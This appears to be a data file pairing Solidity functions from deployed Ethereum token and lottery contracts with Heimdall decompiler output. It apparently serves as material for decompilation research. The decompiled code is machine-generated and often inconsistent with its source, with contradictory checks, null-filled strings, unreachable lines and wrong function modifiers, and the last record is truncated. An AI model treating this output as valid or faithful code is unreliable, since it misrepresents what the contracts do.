{"contract_address": "0xfC37E6b475e0522fc5B8FBc319dB80a4555B5AeD", "original_solidity_code": "function pickWinner() public onlyAdmin {\\n        require(!lotteryStatus, \\\"Lottery is still running\\\"); //Lottery must not be running\\n        require(playerSelector.length > 0, \\\"No players in the lottery\\\"); //There must be at least one player\\n        require(nftContract != address(0), \\\"NFT contract not set\\\"); //NFT contract must be set\\n        delete winnerOfPrize;\\n        uint256 index = random() % playerSelector.length; //Get a random index\\n        address winner = playerSelector[index]; //Get the winner address\\n        emit Winner(winner); //Emit the event that a winner was picked\\n        winnerOfPrize.push(winner);\\n        ERC721Base(nftContract).transferFrom(admin, winner, tokenId);\\n        resetEntryCounts(); //Reset the entry counts\\n        delete playerSelector; // Reset the playerSelector array\\n        delete players; // Reset the players array\\n        lotteryStatus = false; // Set lottery status to completed\\n        nftContract = address(0); // Reset the NFT contract address\\n        tokenId = 0; // Reset the token ID\\n        totalEntries = 0; // Reset the total entries\\n        \\n    }", "heimdall_decompiled_code": "function pickWinner() public {\n        require(msg.sender == (address(admin)), \"Only admin can call this function\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x4f6e6c792061646d696e2063616e2063616c6c20746869732066756e6374696f;\n        var_e = 0x6e00000000000000000000000000000000000000000000000000000000000000;\n        require(!(bytes1(lotteryStatus)), \"Lottery is still running\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x18;\n        var_d = 0x4c6f7474657279206973207374696c6c2072756e6e696e670000000000000000;\n        require(store_k);\n        require(address(nftContract));\n        store_i = 0;\n        var_f = 0x04;\n        require(!(keccak256(var_f) + store_i) > keccak256(var_f));\n        uint256 var_g = block.prevrandao;\n        uint256 var_h = block.timestamp;\n        var_i = store_m;\n        uint256 var_a = 0x60 + (var_j - var_j);\n        uint256 var_j = var_j + 0x80;\n        require(store_k);\n        require((keccak256(var_k) % store_k) < store_k);\n        var_f = 0x03;\n        address var_l = address(storage_map_n[var_f]);\n        emit Winner(address(storage_map_n[var_f]));\n        store_i = store_i + 0x01;\n        var_f = 0x04;\n        store_o = (address(storage_map_n[var_f])) | (uint96(store_o));\n        var_l = 0x23b872dd00000000000000000000000000000000000000000000000000000000;\n        address var_m = address(admin);\n        address var_n = address(storage_map_n[var_f]);\n        var_o = tokenId;\n        require(address(nftContract).code.length);\n        (bool success, bytes memory ret0) = address(nftContract).{ value: 0 ether }Unresolved_23b872dd(var_m); // call\n        if (!0 < store_m) {\n            require(!(0 < store_m), \"NFT contract not set\");\n            var_f = 0x02;\n            address var_f = address(storage_map_p[var_f]);\n            var_p = 0x01;\n            storage_map_q[var_f] = 0;\n            require(0 < store_m, \"NFT contract not set\");\n            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_q = 0x11;\n            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_q = 0x32;\n            store_k = 0;\n            var_f = 0x03;\n            require(0x01, \"NFT contract not set\");\n        }\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_q = 0x32;\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_q = 0x12;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x14;\n        var_d = 0x4e465420636f6e7472616374206e6f7420736574000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x19;\n        var_d = 0x4e6f20706c617965727320696e20746865206c6f747465727900000000000000;\n    }"}
{"contract_address": "0x513D675cA0b1EE3A79B055F18D3D8Ea18F07F9aA", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB997F52A0cF32b5120eD31BEAbaeF3Af6256cb77", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9BA9A8e963fDa423Ba29948Bfa34844d3AA9C173", "original_solidity_code": "function removeLimits() external onlyOwner{\\n        _maxTxAmount = _tTotal;\\n        _maxWalletSize=_tTotal;\\n        transferDelayEnabled=false;\\n        emit MaxTxAmountUpdated(_tTotal);\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x01dcd65000) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x01dcd65000;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x01dcd65000) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x01dcd65000;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x01dcd65000) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x01dcd65000;\n                                emit MaxTxAmountUpdated(0x01dcd65000);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x531f60e490298A93bd6379E2cCe84E087818c93d", "original_solidity_code": "function removeLimits() external onlyOwner {\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize = _tTotal;\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxTxAmount = 0x016345785d8a0000;\n        _maxWalletSize = 0x016345785d8a0000;\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function setSellDestFee(uint256 newSellDestroyFee) public onlyOwner {\r\n        _sellDestroyFee = newSellDestroyFee;\r\n        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);\r\n    }", "heimdall_decompiled_code": "function setSellDestFee(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _sellDestroyFee = arg0;\n        require(!(_sellLiquidityFee > ~(_sellMarketingFee)), \"SafeMath: addition overflow\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!((_sellLiquidityFee + _sellMarketingFee) < _sellLiquidityFee), \"SafeMath: addition overflow\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n    }"}
{"contract_address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1", "original_solidity_code": "function checkUserPurchaseTime(address _user) external view returns (uint256) {\r\n        return purchaseTimestamp[_user];\r\n    }", "heimdall_decompiled_code": "function checkUserPurchaseTime(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x0e;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x62DdfB2BA9444095aA52f34c00f73de37436139B", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        if (_isExcluded[account]) return _tOwned[account];\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x04;\n        require(!(bytes1(storage_map_c[var_a] / 0x01)), \"Amount must be less than total reflections\");\n        var_a = address(arg0);\n        var_b = 0x02;\n        address var_c = storage_map_c[var_a];\n        return storage_map_c[var_a];\n        var_a = address(arg0);\n        var_b = 0x01;\n        require(!(storage_map_c[var_a] > store_g), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x2a;\n        var_g = this.code[12762:12804];\n        require(!(0 < store_h), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(0 < store_h, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x05;\n        var_a = address(storage_map_i[var_a] / 0x01);\n        var_b = 0x01;\n        require(storage_map_c[var_a] > store_g, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(storage_map_c[var_a] > store_g), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_h = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x084595161401484a000000 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_j = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_k = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_l = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_m);\n        var_l = var_n;\n        require(0x084595161401484a000000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(0 < store_h, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x05;\n        var_a = address(storage_map_i[var_a] / 0x01);\n        var_b = 0x01;\n        var_e = 0x40 + var_e;\n        var_c = 0x1e;\n        var_h = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(storage_map_c[var_a] > store_g), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_k = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_l = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_m);\n        var_l = var_n;\n        require(0 < store_h, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(0 < store_h, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_h = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x084595161401484a000000 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_j = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_k = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_l = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_m);\n        var_l = var_n;\n        if (0x084595161401484a000000) {\n            require(0x084595161401484a000000);\n        }\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function updateMarketingWallet(address newMarketingWallet)\r\n        external\r\n        onlyOwner\r\n    {\r\n        emit MarketingWalletUpdated(newMarketingWallet, MarketingWallet);\r\n        MarketingWallet = newMarketingWallet;\r\n    }", "heimdall_decompiled_code": "function updateMarketingWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit MarketingWalletUpdated(address(arg0), address(lastLpBurnTimec));\n        lastLpBurnTimec = (address(arg0)) | (uint96(lastLpBurnTimec));\n    }"}
{"contract_address": "0x7BEe550EDa5afA8E1C22Ad3Cea77f5D746dC78c3", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remaining number of tokens that `spender` will be\\r\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        if (!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            var_a = address(msg.sender);\n            var_b = 0x04;\n            storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n            require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n            var_a = address(msg.sender);\n            var_b = 0x02;\n            require(tx.origin == (address(arg0)), \"ERC20: transfer to the zero address\");\n            require(!(!0x01 == (bytes1(storage_map_b[var_a]))), \"ERC20: transfer to the zero address\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            require((0 == ((0 * arg1) / arg1)) | !arg1, \"ERC20: transfer to the zero address\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x12;\n            require(0x64, \"ERC20: transfer to the zero address\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            require(!(0 > (((0 * arg1) / 0x64) + 0)), \"ERC20: transfer to the zero address\");\n            var_a = address(store_d);\n            var_b = 0x04;\n            require(!(((0 * arg1) / 0x64) + 0), \"ERC20: transfer to the zero address\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            require(!(storage_map_b[var_a] > ((((0 * arg1) / 0x64) + 0) + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            require(!((arg1 - (((0 * arg1) / 0x64) + 0)) > arg1), \"ERC20: transfer to the zero address\");\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x69dfa326b4636d0d5D256CFEce392B25799daf3c", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6BC7d0c26885D7c1C384c3aF3CA6214D628B2712", "original_solidity_code": "function updateMaxTxnAmount(uint256 newNum) external onlyOwner {\\n        require(newNum >= ((totalSupply() * 1) / 1000) / 1e18, \\\"Cannot set maxTransactionAmount lower than 0.1%\\\");\\n        maxTransactionAmount = newNum * (10 ** 18);\\n    }", "heimdall_decompiled_code": "function updateMaxTxnAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x01) / 0x01)) | !0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x0571e4201619916DB35214e935F0E46F037BBd2D", "original_solidity_code": "function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {\r\n        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);\r\n        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;\r\n        uint256 limit = totalSupply().mul(5).div(1000);\r\n        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, \"Max TXs and Max Wallet cannot be less than .5%\");\r\n    }", "heimdall_decompiled_code": "function setTransactionLimits(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        require((arg0 == ((arg0 * store_c) / store_c)) | !store_c);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require((arg1 == ((arg1 * store_c) / store_c)) | !store_c);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require((arg2 == ((arg2 * store_c) / store_c)) | !store_c);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        _maxTxAmount = (arg0 * store_c) / 0x2710;\n        _maxSellAmount = (arg1 * store_c) / 0x2710;\n        _maxWalletToken = (arg2 * store_c) / 0x2710;\n        var_g = 0x02;\n        var_e = 0xdead;\n        require(!(store_c - store_s) > store_c);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0xe7fEA96bA7a112602bCfe9a472473627D88c3De5", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x561DeA92170f405c37fD183CAb08E41ea5d3DBEC", "original_solidity_code": "function isBot(address a) public view returns (bool){\\n      return bots[a];\\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0xD3144dc5a6cAdb52E565a9D229cD2902D2faeeBb", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x90B22290c39A7D7451fb9B7922cB11e701308E97", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(address(arg0) - 0, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(arg1 > 0, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_c / 0x01))), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_d / 0x01))), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        address var_a = address(tx.origin);\n        var_b = 0x04;\n        require(storage_map_e[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x49;\n        var_g = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_h = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_i = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_b = 0x04;\n        storage_map_e[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_d / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_d / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_d / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_d / 0x01))), \"SafeMath: addition 